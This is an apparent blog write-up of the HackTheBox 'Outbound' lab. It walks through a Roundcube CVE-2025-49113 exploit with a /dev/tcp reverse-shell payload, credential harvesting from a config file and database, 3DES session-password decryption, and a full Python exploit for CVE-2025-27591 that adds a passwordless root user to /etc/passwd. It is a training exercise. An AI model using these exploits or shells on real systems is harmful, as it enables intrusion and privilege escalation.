---
title: Outbound Writeup
date: 2025-11-16
categories: [HackTheBox Challenges, HTB Easy]
tags: [htb, challenge, easy]
description: HackTheBox Outbound Easy Challenge Writeup
---

> Challenge description:
> 
> As is common in real life pentests, you will start the Outbound box with credentials for the following account:
> 
> tyler / LhKL1o9Nm3X2
{: .prompt-info }

<br>

---

## Adding IP to /etc/hosts

Add your machine IP into your /etc/hosts:
```terminal
10.10.11.77 outbound.htb
```

## Rustscan

Let's use Rustscan/Nmap to check the ports on the Outbound machine.

```terminal
┌──(kali㉿kali)-[~/Desktop/HTB/Outbound]
└─$ rustscan -a outbound.htb -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned my computer so many times, it thinks we're dating.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
Open 10.10.11.77:22
Open 10.10.11.77:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A" on ip 10.10.11.77
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 05:45 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
Initiating Ping Scan at 05:45
Scanning 10.10.11.77 [4 ports]
Completed Ping Scan at 05:45, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 05:45
Scanning outbound.htb (10.10.11.77) [2 ports]
Discovered open port 80/tcp on 10.10.11.77
Discovered open port 22/tcp on 10.10.11.77
Completed SYN Stealth Scan at 05:45, 0.09s elapsed (2 total ports)
Initiating Service scan at 05:45
Scanning 2 services on outbound.htb (10.10.11.77)
Completed Service scan at 05:45, 6.15s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against outbound.htb (10.10.11.77)
Initiating Traceroute at 05:45
Completed Traceroute at 05:45, 0.07s elapsed
Initiating Parallel DNS resolution of 1 host. at 05:45
Completed Parallel DNS resolution of 1 host. at 05:45, 0.16s elapsed
DNS resolution of 1 IPs took 0.16s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
NSE: Script scanning 10.10.11.77.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 2.05s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.29s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
Nmap scan report for outbound.htb (10.10.11.77)
Host is up, received echo-reply ttl 63 (0.069s latency).
Scanned at 2025-11-11 05:45:17 EST for 10s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/11%OT=22%CT=%CU=30946%PV=Y%DS=2%DC=T%G=N%TM=691313C
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST1
OS:1NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 19.440 days (since Wed Oct 22 20:11:35 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   69.35 ms 10.10.14.1
2   69.43 ms outbound.htb (10.10.11.77)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:45
Completed NSE at 05:45, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.85 seconds
           Raw packets sent: 38 (2.458KB) | Rcvd: 28 (1.886KB)
```

This is a lot of output from Rustscan (as normal), but this is the main part you need to focus on.

```terminal
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
```

We only have two ports: SSH (20) and HTTP (80). Let's first check HTTP.

## HTTP(80)

![Trouble with website](/assets/img/htb/outbound/Trouble%20Finding%20Site.png)

It seems like the IP address redirects to mail.outbound.htb, not oubound.htb. We can add mail.outbound.htb to the end of line in /etc/hosts. It would look like this now:

```terminal
10.10.11.77 outbound.htb mail.outbound.htb
```

![Roundcube Webmail](/assets/img/htb/outbound/Roundcube%20Webmail.png)

A login page! This is probably where we use the credentials we have from the beginning of the challenge.

![Logged In](/assets/img/htb/outbound/Logged%20in.png)

We don't have anything in our Inbox.

### Exploit & Reverse Shell

Let's check the About part of the site.

![About](/assets/img/htb/outbound/About.png)

We have a program name and version. In these cases, it is good to search for possible exploits that exist on that program and version.

![Exploits](/assets/img/htb/outbound/Exploits.png)

We do have exploits! The specific CVE name is CVE-2025-49113. I would recommend reading this article to understand it: [https://www.offsec.com/blog/cve-2025-49113/](https://www.offsec.com/blog/cve-2025-49113/).

To actually exploit this program, we can use this: [https://github.com/hakaioffsec/CVE-2025-49113-exploit](https://github.com/hakaioffsec/CVE-2025-49113-exploit).

```terminal
┌──(kali㉿kali)-[~/Desktop/HTB/Outbound]
└─$ git clone https://github.com/hakaioffsec/CVE-2025-49113-exploit.git

┌──(kali㉿kali)-[~/Desktop/HTB/Outbound]
└─$ cd CVE-2025-49113-exploit
```

We need to setup a listener on our attacker machine. We can use Netcat or [Penelope](https://github.com/brightio/penelope).

```terminal
┌──(kali㉿kali)-[~/Desktop/HTB/Outbound/CVE-2025-49113-exploit]
└─$ penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 →  REDACTEDS
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Now, for the exploit, we can use this command:
```terminal
php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 'printf base_64_stuff | base64 -d | bash'
```

Change the `base_64_stuff` to `(bash >& /dev/tcp/Your_IP/Your_Port 0>&1) &` in base64.

```terminal
┌──(kali㉿kali)-[~/Desktop/HTB/Outbound/CVE-2025-49113-exploit]
└─$ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 'printf base_64_stuff | base64 -d | bash'-d | bash'
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
[+] Gadget uploaded successfully!
```

```terminal
┌──(kali㉿kali)-[~/Desktop/HTB/Outbound/CVE-2025-49113-exploit]
└─$ penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 →  REDACTEDS
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from mail.outbound.htb~10.10.11.77-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on REDACTED:1337
[+] Got reverse shell from mail.outbound.htb~10.10.11.77-Linux-x86_64 😍 Assigned SessionID <2>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Interacting with session [2], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/mail.outbound.htb~10.10.11.77-Linux-x86_64/2025_11_11-06_09_55-538.log 📜
────────────────────────────────────────────────────────────────────────────
www-data@mail:/$
```

We got a reverse shell!

## User Flag
It's possible that the tyler user uses the same password as the mail site. We can do `su tyler` and put in the password.

```terminal
www-data@mail:/$ su tyler
Password: 
tyler@mail:/$
```

It worked! Let's try `sudo -l` for anything would could use.

```terminal
tyler@mail:/$ sudo -l
bash: sudo: command not found
```

Hmm, doesn't seem sudo exists. Let's check for any configuration files available.

```terminal
tyler@mail:/$ cd /var/www/html
tyler@mail:/var/www/html$ ls
index.nginx-debian.html  roundcube
tyler@mail:/var/www/html$ cd roundcube
tyler@mail:/var/www/html/roundcube$
tyler@mail:/var/www/html/roundcube$ ls
CHANGELOG.md  SECURITY.md  composer.json  logs         skins
INSTALL       SQL          composer.lock  plugins      temp
LICENSE       UPGRADING    config         program      vendor
README.md     bin          index.php      public_html
```

So we do have a config folder. Let's check it out.

```terminal
tyler@mail:/var/www/html/roundcube$ cd config
tyler@mail:/var/www/html/roundcube/config$ ls
config.inc.php  config.inc.php.sample  defaults.inc.php  mimetypes.php
tyler@mail:/var/www/html/roundcube/config$ cat config.inc.php
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];

// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';

mysql://roundcube:RCDBPass2025@localhost/roundcube
```

We have a `des_key`, which might be useful in the future. We also have a host, user, and password for MySQL. Let's log in.

### MySQL

```terminal
tyler@mail:/var/www/html/roundcube/config$ mysql -h localhost -u roundcube -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 341
Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| roundcube          |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use roundcube
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [roundcube]> show tables;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
17 rows in set (0.000 sec)

MariaDB [roundcube]> select * from users;
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                       |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-06-11 07:52:49 | 2025-06-11 07:51:32 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";} |
|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";} |
|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-11-11 10:41:39 | 2025-06-11 07:51:22 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"Y2Rz3HTwxwLJHevI";} |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
3 rows in set (0.000 sec)

MariaDB [roundcube]>
```

It seems like we got some sort of client hash, but it seems like its only for preferences on the website. Let's continue searching.

```terminal
MariaDB [roundcube]> select * from session;
+----------------------------+---------------------+------------+-----------------+
| sess_id                    | changed             | ip         | vars            |
+----------------------------+---------------------+------------+-----------------+
| 1r0o25kdsihn0b7kalsjreog6q | 2025-11-11 10:41:42 | 172.17.0.1 | REDACTED_BASE64 |
| 2g5sukq3piof4nvel2nqf139jq | 2025-11-11 10:39:35 | 172.17.0.1 | REDACTED_BASE64 |
| 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | REDACTED_BASE64 |
| 6f060sejpua3l7eg7jl8lacboq | 2025-11-11 10:41:42 | 172.17.0.1 | REDACTED_BASE64 |
| 7cbudeoa9ter7d6a0mg8n834av | 2025-11-11 10:41:38 | 172.17.0.1 | REDACTED_BASE64 |
+----------------------------+---------------------+------------+-----------------+
5 rows in set (0.000 sec)
```

This is a lot of output, but the main parts to focus on are the large base64 encoded texts. It might contain useful information for us. Let's check this one first:

```
bGFuZ3VhZ2V8czo1OiJlb...vbiI7czowOiIiO30=
```

We can use [CyberChef](https://gchq.github.io/CyberChef/) to decode this.

![Tyler](/assets/img/htb/outbound/tyler%20auth.png)

The information we got isn't that useful as we already have access to Tyler account. However, it does tell us that there could be useful information for other users. We can check the next base64 text:

```
bGFuZ3VhZ2V8czo1OiJlb...zZXF8czoyOiIxMCI7
```

![Jacob](/assets/img/htb/outbound/jacob%20auth.png)

Ahah! We got quite some useful information.

### 3DES

A `des_key` was found in the `config.inc.php` file (where we also found the MySQL credentials), and we found the "password" for the jacob user. With some more searching, I found out that Triple DES was being used. A little bit of searching gave me this link:
[https://www.roundcubeforum.net/index.php?topic=23399.0](https://www.roundcubeforum.net/index.php?topic=23399.0)

Looking at this, we need to base64 decrypt the "password" we found and convert to hexadecimal. The first eight bytes will be used as the IV for Triple DES while the rest will be used as the ciphertext.

First, base64 is used for decryption, then converted to hexadecimal. The first eight bytes are used as the IV, and the remaining bytes are used as the ciphertext.

![Jacob](/assets/img/htb/outbound/jacob%20IV%20+%20ciphertext.png)

![Jacob Roundcube Password](/assets/img/htb/outbound/jacob%20roundcube%20pass.png)

We got jacob's password! Let's log in to the mail server. Remember, this is for the Roundcube mailserver, not SSH.

![Jacob Mail](/assets/img/htb/outbound/jacob%20mail.png)

Hmm, we have an email from tyler, let's check it out.

![Jacob SSH Password](/assets/img/htb/outbound/jacob%20pass.png)

It seems like we got another password! Since this is different from the Roundcube password, its probably jacob's SSH password!

```terminal
┌──(kali㉿kali)-[~/Desktop/HTB/Outbound]
└─$ ssh jacob@outbound.htb
The authenticity of host 'outbound.htb (10.10.11.77)' can't be established.
ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'outbound.htb' (ED25519) to the list of known hosts.
jacob@outbound.htb's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Nov 11 11:50:00 AM UTC 2025

  System load:  0.08              Processes:             269
  Usage of /:   75.2% of 6.73GB   Users logged in:       0
  Memory usage: 11%               IPv4 address for eth0: 10.10.11.77
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Nov 11 10:56:32 2025 from REDACTED
jacob@outbound:~$ ls
user.txt
jacob@outbound:~$ cat user.txt
REDACTED
```

## Root Flag

Let's try `sudo -l` as jacob.

```terminal
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below
        --debug*, !/usr/bin/below -d*
```

Hmm, we have access to the `/usr/bin/below` command. After researching, I got this CVE:
[https://github.com/BridgerAlderson/CVE-2025-27591-PoC](https://github.com/BridgerAlderson/CVE-2025-27591-PoC)

We need to check if the `/var/log/below` folder and the `/var/log/below/error_root.log` file are both world writable.

```terminal
jacob@outbound:~cd $ ls -lah /var/log | grep below
drwxrwxrwx   3 root      root            4.0K Nov 11 11:08 below
jacob@outbound:~$ cd /var/log/below
jacob@outbound:/var/log/below$ ls -lah error_root.log 
-rw-rw-rw- 1 root root 0 Nov 11 11:08 error_root.log
```

They both are world writeable! We can use the exploit.py in the GitHub Repository above.

```
jacob@outbound:/var/log/below$ cd /tmp
jacob@outbound:/tmp$ nano exploit.py
jacob@outbound:/tmp$ cat exploit.py
#!/usr/bin/env python3
import os
import subprocess
import sys
import pty

BINARY = "/usr/bin/below"
LOG_DIR = "/var/log/below"
TARGET_LOG = f"{LOG_DIR}/error_root.log"
TMP_PAYLOAD = "/tmp/attacker"

MALICIOUS_PASSWD_LINE = "attacker::0:0:attacker:/root:/bin/bash\n"

def check_world_writable(path):
    st = os.stat(path)
    return bool(st.st_mode & 0o002)

def is_symlink(path):
    return os.path.islink(path)

def run_cmd(cmd, show_output=True):
    if show_output:
        print(f"[+] Running: {cmd}")
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        if show_output:
            print(f"[-] Command failed: {e.output}")
        return None

def check_vulnerability():
    print("[*] Checking for CVE-2025-27591 vulnerability...")

    if not os.path.exists(LOG_DIR):
        print(f"[-] Log directory {LOG_DIR} does not exist.")
        return False

    if not check_world_writable(LOG_DIR):
        print(f"[-] {LOG_DIR} is not world-writable.")
        return False
    print(f"[+] {LOG_DIR} is world-writable.")

    if os.path.exists(TARGET_LOG):
        if is_symlink(TARGET_LOG):
            print(f"[+] {TARGET_LOG} is already a symlink. Looks exploitable.")
            return True
        else:
            print(f"[!] {TARGET_LOG} is a regular file. Removing it...")
            os.remove(TARGET_LOG)

    try:
        os.symlink("/etc/passwd", TARGET_LOG)
        print(f"[+] Symlink created: {TARGET_LOG} -> /etc/passwd")
        os.remove(TARGET_LOG)  
        return True
    except Exception as e:
        print(f"[-] Failed to create symlink: {e}")
        return False

def exploit():
    print("[*] Starting exploitation...")

    with open(TMP_PAYLOAD, "w") as f:
        f.write(MALICIOUS_PASSWD_LINE)
    print(f"[+] Wrote malicious passwd line to {TMP_PAYLOAD}")

    if os.path.exists(TARGET_LOG):
        os.remove(TARGET_LOG)
    os.symlink("/etc/passwd", TARGET_LOG)
    print(f"[+] Symlink set: {TARGET_LOG} -> /etc/passwd")

    print("[*] Executing 'below record' as root to trigger logging...")
    try:
        subprocess.run(["sudo", BINARY, "record"], timeout=40)
        print("[+] 'below record' executed.")
    except subprocess.TimeoutExpired:
        print("[-] 'below record' timed out (may still have written to the file).")
    except Exception as e:
        print(f"[-] Failed to execute 'below': {e}")

    print("[*] Appending payload into /etc/passwd via symlink...")
    try:
        with open(TARGET_LOG, "a") as f:
            f.write(MALICIOUS_PASSWD_LINE)
        print("[+] Payload appended successfully.")
    except Exception as e:
        print(f"[-] Failed to append payload: {e}")

    print("[*] Attempting to switch to root shell via 'su attacker'...")
    try:
        pty.spawn(["su", "attacker"])
    except Exception as e:
        print(f"[-] Failed to spawn shell: {e}")
        return False

def main():
    if not check_vulnerability():
        print("[-] Target does not appear vulnerable.")
        sys.exit(1)
    print("[+] Target is vulnerable.")

    if not exploit():
        print("[-] Exploitation failed.")
        sys.exit(1)

if __name__ == "__main__":
    main()
jacob@outbound:/tmp$ python3 exploit.py
[*] Checking for CVE-2025-27591 vulnerability...
[+] /var/log/below is world-writable.
[!] /var/log/below/error_root.log is a regular file. Removing it...
[+] Symlink created: /var/log/below/error_root.log -> /etc/passwd
[+] Target is vulnerable.
[*] Starting exploitation...
[+] Wrote malicious passwd line to /tmp/attacker
[+] Symlink set: /var/log/below/error_root.log -> /etc/passwd
[*] Executing 'below record' as root to trigger logging...
Nov 11 12:01:55.752 DEBG Starting up!
Nov 11 12:01:55.753 ERRO 
----------------- Detected unclean exit ---------------------
Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01762819200: EAGAIN: Try again
-------------------------------------------------------------
[+] 'below record' executed.
[*] Appending payload into /etc/passwd via symlink...
[+] Payload appended successfully.
[*] Attempting to switch to root shell via 'su attacker'...
root@outbound:/tmp#
```

We are root! Let's get the root flag!

```terminal
root@outbound:/tmp# cd /root
root@outbound:~# ls
root.txt
root@outbound:~# cat root.txt
REDACTED
```

# We got all flags!!!!!!!